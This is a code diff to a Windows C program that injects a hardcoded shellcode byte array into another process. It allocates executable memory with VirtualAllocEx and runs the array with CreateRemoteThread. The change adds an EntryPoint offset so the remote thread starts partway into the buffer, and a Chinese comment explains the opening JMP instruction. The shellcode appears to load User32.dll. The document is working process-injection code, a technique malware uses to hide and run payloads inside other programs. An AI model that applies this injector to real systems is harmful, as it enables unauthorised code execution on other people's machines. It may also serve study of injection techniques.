@@ -3,6 +3,7 @@
 #include <stdio.h>
 
 
+INT EntryPoint = 0x0;
 BYTE Shellcode[] = {
 	0xeb,0x2e,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00, // 这行的作用是直接JMP跳转到入口点 JMP $+0x30
 	0x55,0x73,0x65,0x72,0x33,0x32,0x2e,0x64,0x6c,0x6c,0x00,0x00,0x00,0x00,0x00,0x00,
@@ -55,7 +56,7 @@ int _tmain(int argc, TCHAR* argv[]) {
 		return 0;
 	}
 
-	PVOID Buffer = VirtualAllocEx(hProcess, NULL, sizeof(Shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	BYTE* Buffer = (BYTE*)VirtualAllocEx(hProcess, NULL, sizeof(Shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 	if (Buffer == NULL) {
 		_tprintf(_T("[x] VirtualAllocEx failed, error: 0x%x\n"), GetLastError());
 		CloseHandle(hProcess);
@@ -71,7 +72,7 @@ int _tmain(int argc, TCHAR* argv[]) {
 	}
 
 	DWORD ThreadId;
-	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)Buffer, NULL, 0, &ThreadId);
+	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)&Buffer[EntryPoint], NULL, 0, &ThreadId);
 	if (hThread == NULL) {
 		_tprintf(_T("[x] CreateRemoteThread failed, error: 0x%x\n"), GetLastError());
 		CloseHandle(hProcess);
